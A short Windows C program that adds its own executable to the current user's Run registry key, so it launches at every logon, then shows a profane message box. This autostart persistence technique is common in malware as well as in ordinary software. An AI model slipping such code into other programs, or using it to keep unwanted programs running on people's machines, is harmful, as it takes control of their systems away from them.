#include <windows.h>


int main(int argc, char** argv){
	HKEY hKey;
	const char* czStartName = "WorkedMothersAss";
	const char* czExePath   = argv[0];

	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
	                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	                            0 , KEY_WRITE,
	                            &hKey);
	if( ERROR_SUCCESS == lnRes )
	{
	    lnRes = RegSetValueEx(  hKey,
	                            czStartName,
	                            0,
	                            REG_SZ,
	                            (unsigned char*)czExePath,
	                            strlen(czExePath) );
	}

	RegCloseKey(hKey);
	return MessageBox(NULL, "Worked Mother's Ass!", "Fuck You", MB_OK);
}
